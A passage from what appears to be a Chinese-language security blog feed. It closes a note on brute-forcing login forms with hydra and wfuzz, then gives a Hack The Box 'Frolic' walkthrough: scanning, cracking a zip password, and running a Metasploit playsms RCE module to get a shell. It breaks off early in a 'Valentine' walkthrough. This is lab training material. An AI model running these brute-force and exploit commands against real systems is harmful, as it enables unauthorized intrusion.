class="hljs awk">hydra -U http-post-form 查看帮助<br><br>cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Usernames<br>hydra -L top-usernames-shortlist.txt -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">500</span>-worst-passwords.txt -f **ip** http-post-form <span class="hljs-string">&quot;/admin.php:user=^USER^&amp;pass=^PASS^:HERE&quot;</span><br></code></pre></div></td></tr></table></figure><p><code>/admin.php</code> 是URI</p><p><code>user pass</code>是抓包后看到的post参数</p><p><code>^USER^</code> 、<code>^PASS^</code> 无需修改</p><p><code>HERE</code> 是登陆错误的提示，需要修改为对应的标识。例如，Invalid credential，就可以在hydra里设置为<code>Invalid</code></p><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wfuzz -c --hl=<span class="hljs-number">18</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Passwords<span class="hljs-regexp">/darkweb2017-top1000.txt -d &#x27;username=admin&amp;password=FUZZ&amp;submit=Login&#x27; http:/</span><span class="hljs-regexp">/&#123;IP&#125;/</span>login<br><br>-d 设置burp拦截的登陆表单参数<br>-c 有颜色的输出<br>--h1 设置错误响应的长度，如果长度不是<span class="hljs-number">18</span>，则说明找到正确密码<br>--hc 隐藏具体的响应代码，例如<span class="hljs-number">404</span>,<span class="hljs-number">200</span>之类的<br>FUZZ 是需要爆破替换的地址。<br>--basic 测试一个需要HTTP Basic Auth保护的内容<br>-z 扫描模式，可以字典扫描，数字范围扫描。。。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Frolic(CTF-like again)</title>
    <link href="/2019/03/23/05-x/"/>
    <url>/2019/03/23/05-x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.111</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Nmap 7.70 scan initiated Fri Mar 22 16:23:48 2019 as:</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-Pn</span> <span class="hljs-string">-sV</span> <span class="hljs-string">-sC</span> <span class="hljs-string">-p22,137,139,445,1880,9999</span> <span class="hljs-string">-oN</span> <span class="hljs-string">nmap-result</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.111</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.111</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.29s</span> <span class="hljs-string">latency).</span><br><br><span class="hljs-string">PORT</span>     <span class="hljs-string">STATE</span>  <span class="hljs-string">SERVICE</span>     <span class="hljs-string">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>   <span class="hljs-string">ssh</span>         <span class="hljs-string">OpenSSH</span> <span class="hljs-number">7.</span><span class="hljs-string">2p2</span> <span class="hljs-string">Ubuntu</span> <span class="hljs-string">4ubuntu2.4</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-string">Linux;</span> <span class="hljs-string">protocol</span> <span class="hljs-number">2.0</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ssh-hostkey:</span> <br><span class="hljs-string">|</span>   <span class="hljs-number">2048 </span><span class="hljs-number">87</span><span class="hljs-string">:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21</span> <span class="hljs-string">(RSA)</span><br><span class="hljs-string">|</span>   <span class="hljs-number">256</span> <span class="hljs-string">b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62</span> <span class="hljs-string">(ECDSA)</span><br><span class="hljs-string">|_</span>  <span class="hljs-number">256</span> <span class="hljs-number">21</span><span class="hljs-string">:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0</span> <span class="hljs-string">(ED25519)</span><br><span class="hljs-number">137</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">closed</span> <span class="hljs-string">netbios-ns</span><br><span class="hljs-number">139</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>   <span class="hljs-string">netbios-ssn</span> <span class="hljs-string">Samba</span> <span class="hljs-string">smbd</span> <span class="hljs-number">3.</span><span class="hljs-string">X</span> <span class="hljs-bullet">-</span> <span class="hljs-number">4.</span><span class="hljs-string">X</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">WORKGROUP)</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>   <span class="hljs-string">netbios-ssn</span> <span class="hljs-string">Samba</span> <span class="hljs-string">smbd</span> <span class="hljs-number">4.3</span><span class="hljs-number">.11</span><span class="hljs-string">-Ubuntu</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">WORKGROUP)</span><br><span class="hljs-number">1880</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>   <span class="hljs-string">http</span>        <span class="hljs-string">Node.js</span> <span class="hljs-string">(Express</span> <span class="hljs-string">middleware)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Node-RED</span><br><span class="hljs-number">9999</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>   <span class="hljs-string">http</span>        <span class="hljs-string">nginx</span> <span class="hljs-number">1.10</span><span class="hljs-number">.3</span> <span class="hljs-string">(Ubuntu)</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">nginx/1.10.3</span> <span class="hljs-string">(Ubuntu)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Welcome</span> <span class="hljs-string">to</span> <span class="hljs-string">nginx!</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">FROLIC;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Linux;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel</span><br><br><span class="hljs-attr">Host script results:</span><br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">-1h55m35s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">3h10m30s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">-5m37s</span><br><span class="hljs-string">|_nbstat:</span> <span class="hljs-attr">NetBIOS name:</span> <span class="hljs-string">FROLIC,</span> <span class="hljs-attr">NetBIOS user:</span> <span class="hljs-string">&lt;unknown&gt;,</span> <span class="hljs-attr">NetBIOS MAC:</span> <span class="hljs-string">&lt;unknown&gt;</span> <span class="hljs-string">(unknown)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">6.1</span> <span class="hljs-string">(Samba</span> <span class="hljs-number">4.3</span><span class="hljs-number">.11</span><span class="hljs-string">-Ubuntu)</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">frolic</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">FROLIC\x00</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Domain name:</span> <span class="hljs-string">\x00</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">FQDN:</span> <span class="hljs-string">frolic</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2019-03-22T13:48:27+05:30</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">guest</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">disabled</span> <span class="hljs-string">(dangerous,</span> <span class="hljs-string">but</span> <span class="hljs-string">default)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">2.02:</span> <br><span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">but</span> <span class="hljs-string">not</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2019-03-22 16:18:27</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-string">N/A</span><br><br><span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">done</span> <span class="hljs-string">at</span> <span class="hljs-string">Fri</span> <span class="hljs-string">Mar</span> <span class="hljs-number">22</span> <span class="hljs-number">16</span><span class="hljs-string">:24:14</span> <span class="hljs-number">2019</span> <span class="hljs-string">--</span> <span class="hljs-number">1</span> <span class="hljs-string">IP</span> <span class="hljs-string">address</span> <span class="hljs-string">(1</span> <span class="hljs-string">host</span> <span class="hljs-string">up)</span> <span class="hljs-string">scanned</span> <span class="hljs-string">in</span> <span class="hljs-number">26.78</span> <span class="hljs-string">seconds</span><br></code></pre></div></td></tr></table></figure><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h5><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">nikto -h http:<span class="hljs-regexp">//</span>forlic.htb:<span class="hljs-number">1880</span><br>+ Retrieved x-powered-by header: Express<br></code></pre></div></td></tr></table></figure><h5 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h5><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">searchsploit Express<br>searchsploit <span class="hljs-keyword">Node</span><span class="hljs-title">-RED</span><br>searchsploit Node.js<br>google express.js exploit<br>searchsploit playsms<br><br>Node.JS - &#x27;<span class="hljs-keyword">node</span><span class="hljs-title">-serialize</span>&#x27; Remote Code Execution  未验证<br></code></pre></div></td></tr></table></figure><h5 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h5><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span> <br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">1880</span><br><br><span class="hljs-number">9999</span>端口，内容显示<br><br>Thank you <span class="hljs-keyword">for</span> using nginx. http:<span class="hljs-regexp">//</span>forlic.htb:<span class="hljs-number">1880</span> <br><br>于是`echo <span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span> forlic.htb &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts`<br>就可以通过域名访问，http:<span class="hljs-regexp">//</span>forlic.htb:<span class="hljs-number">1880</span> <br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/1.PNG" alt="1"></p><p>发现一个登陆表单</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gobuster -u http:<span class="hljs-regexp">//</span>forlic.htb:<span class="hljs-number">1880</span>  -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br><br>gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span>  -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br>/admin (Status: <span class="hljs-number">301</span>)<br>/test (Status: <span class="hljs-number">301</span>)<br>/dev (Status: <span class="hljs-number">301</span>)<br>/backup (Status: <span class="hljs-number">301</span>)<br>/loop (Status: <span class="hljs-number">301</span>)<br>/playsms<br></code></pre></div></td></tr></table></figure><h4 id="9999目录发现"><a href="#9999目录发现" class="headerlink" title="9999目录发现"></a>9999目录发现</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/admin/</span> -o admin<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/4.PNG" alt="4"><br>是一个登陆表单</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/5.PNG" alt="5"><br>有3次登陆错误尝试限制</p><p>curl <a href="http://10.10.10.111:9999/admin/">http://10.10.10.111:9999/admin/</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/6.PNG" alt="6"><br>之所以用curl，就是可以很方便的查看源代码</p><p>curl <a href="http://10.10.10.111:9999/admin/js/login.js">http://10.10.10.111:9999/admin/js/login.js</a><br>源码中以明文给出了登陆口令。admin/superduperlooperpassword_lol</p><p>登陆后，有一串不明所以的字符</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/7.PNG" alt="7"><br>考验一点密码学的知识</p><p>google “ook decode”，访问在线密码破解<a href="https://www.dcode.fr/ook-language">https://www.dcode.fr/ook-language</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/8.PNG" alt="8"></p><p>获得一个目录/asdiSIAJJ0QWE9JAS</p><p>curl <a href="http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/">http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/</a> -o unknown</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/9.PNG" alt="9"></p><p>疑似base64编码，sed去除换行符，base64解码并且保存为someformat</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">sed</span> <span class="hljs-string">-i</span> <span class="hljs-string">&#x27;:a;N;s/\n//g;ta&#x27;</span> <span class="hljs-string">unknown</span> <br><span class="hljs-string">cat</span> <span class="hljs-string">unknown</span> <span class="hljs-string">|</span> <span class="hljs-string">base64</span> <span class="hljs-string">-d</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">someformat</span><br><span class="hljs-string">file</span> <span class="hljs-string">someformat</span><br><span class="hljs-string">提示为zip类型，需要解压</span><br><span class="hljs-attr">someformat:</span> <span class="hljs-string">Zip</span> <span class="hljs-string">archive</span> <span class="hljs-string">data,</span> <span class="hljs-string">at</span> <span class="hljs-string">least</span> <span class="hljs-string">v2.0</span> <span class="hljs-string">to</span> <span class="hljs-string">extract</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">mv</span> <span class="hljs-string">someformat</span> <span class="hljs-string">getzip;unzip</span> <span class="hljs-string">getzip</span><br><span class="hljs-string">发现需要密码</span><br><span class="hljs-attr">Archive:</span>  <span class="hljs-string">getzip</span><br>[<span class="hljs-string">getzip</span>] <span class="hljs-attr">index.php password:</span> <br><span class="hljs-attr">password incorrect--reenter:</span> <br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">cd</span> <span class="hljs-string">/usr/share/seclists/Passwords/</span><br><span class="hljs-string">fcrackzip</span> <span class="hljs-string">-D</span> <span class="hljs-string">-u</span> <span class="hljs-string">-p</span> <span class="hljs-string">Most-Popular-Letter-Passes.txt</span> <span class="hljs-string">/root/Desktop/10.10.10.111/getzip</span><br><br><span class="hljs-string">fcrackzip在指定密码列表的时候，要用相对路径。如果使用绝对路径，路径名称太长，工具会报错。</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/10.PNG" alt="10"></p><p>用password作为密码，解压缩得到index.php</p><p>查看后，搜索hex to ascii</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/11.PNG" alt="11"></p><p>然后base64解码一次</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/12.PNG" alt="12"></p><p>然后搜索brainfuck decode，在线解码</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/13.PNG" alt="13"></p><h4 id="获得一个口令idkwhatispass"><a href="#获得一个口令idkwhatispass" class="headerlink" title="获得一个口令idkwhatispass"></a>获得一个口令idkwhatispass</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/test/</span> -o test<br>phpinfo()页面<br>PHP Version <span class="hljs-number">7.0</span>.<span class="hljs-number">32</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">16.04</span>.<span class="hljs-number">1</span><br><br>---<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/dev/</span> -o dev<br><span class="hljs-number">403</span>不允许访问 nginx/<span class="hljs-number">1.10</span>.<span class="hljs-number">3</span> (Ubuntu)<br><br>---<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/backup/</span> -o backup<br>password.txt<br>user.txt<br>loop/<br><br>gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/backup/</span>loop<span class="hljs-regexp">/  -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirbuster/</span>directory-list-<span class="hljs-number">2.3</span>-medium.txt -x txt<br><span class="hljs-number">14</span>:<span class="hljs-number">01</span><br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/backup/</span>loop <span class="hljs-number">403</span> Forbidden<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/backup/</span>loop/password.txt <span class="hljs-number">404</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/backup/</span>loop/user.txt <span class="hljs-number">404</span><br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/backup/</span>password.txt<br>password - imnothuman<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/backup/u</span>ser.txt<br>user - admin<br></code></pre></div></td></tr></table></figure><h4 id="获得口令：admin-imnothuman"><a href="#获得口令：admin-imnothuman" class="headerlink" title="获得口令：admin/imnothuman"></a>获得口令：admin/imnothuman</h4><p>尝试登陆</p><figure class="highlight haml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haml">-<span class="ruby"> <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.10.10.111:9999/admin</span><span class="hljs-regexp">/</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>-<span class="ruby"><span class="hljs-regexp"> http:/</span><span class="hljs-regexp">/forlic.htb:1880/</span></span><br><span class="ruby"></span>-<span class="ruby"> ssh admin<span class="hljs-variable">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">111</span></span><br><span class="ruby"></span>失败<br></code></pre></div></td></tr></table></figure><hr><h4 id="1880目录发现"><a href="#1880目录发现" class="headerlink" title="1880目录发现"></a>1880目录发现</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>forlic.htb:<span class="hljs-number">1880</span>/red -o red<br>curl http:<span class="hljs-regexp">//</span>forlic.htb:<span class="hljs-number">1880</span>/vendor -o vendor<br><br></code></pre></div></td></tr></table></figure><h4 id="139、445"><a href="#139、445" class="headerlink" title="139、445"></a>139、445</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">smbclient -L <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.111</span><br></code></pre></div></td></tr></table></figure><p>picture2, 查看共享的硬盘，服务版本为：Samba 4.3.11-Ubuntu</p><p>searchsploit samba 4.X，查看是否有rce的exp，没有。</p><p>smbmap -H 10.10.10.111</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/3.PNG" alt="3"></p><p>对目标硬盘进行访问，发现没有查看权限</p><h2 id="获得webshell"><a href="#获得webshell" class="headerlink" title="获得webshell"></a>获得webshell</h2><p><a href="https://www.rapid7.com/db/modules/exploit/multi/http/playsms_uploadcsv_exec">https://www.rapid7.com/db/modules/exploit/multi/http/playsms_uploadcsv_exec</a></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">metasploit<br>search playsms<br>use multi/http/playsms_uploadcsv_exec<br><span class="hljs-builtin-name">set</span> RHOSTS 10.10.10.111 <br><span class="hljs-builtin-name">set</span> RPORT 9999<br><span class="hljs-builtin-name">set</span> TARGETURI /playsms<br><span class="hljs-builtin-name">set</span> LHOST tun0<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-23-05/14.PNG" alt="14"></p><p>获得www-data的shell</p><p>find / -name “user.txt” 2&gt;/dev/null</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>提权不会了。以后学一下缓冲区溢出的东西。</p><p>最近怎么老遇到CTF类型的靶机，下回得看清楚再做。。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Valentine（CTF-like also）</title>
    <link href="/2019/03/22/04-x/"/>
    <url>/2019/03/22/04-x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">22</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.79</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">443</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.79</span>                                    <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">80</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.79</span>   <br><br><span class="hljs-attribute">443</span>/tcp open  ssl/http Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">22</span> ((Ubuntu))<br></code></pre></div></td></tr></table></figure><hr><p>访问后发现http和https，虽然端口不同，但是内容都是一样。</p><p>wget <a href="http://10.10.10.79/">http://10.10.10.79</a></p><p>gobuster -u <a href="http://10.10.10.79/">http://10.10.10.79</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>/dev</p><h2 id="notes-txt"><a href="#notes-txt" class="headerlink" title="notes.txt"></a>notes.txt</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.79</span><span class="hljs-regexp">/dev/</span>hype_key<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.79</span><span class="hljs-regexp">/dev/</span>notes.txt<br></code></pre></div></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vhdl"><span class="hljs-keyword">To</span> 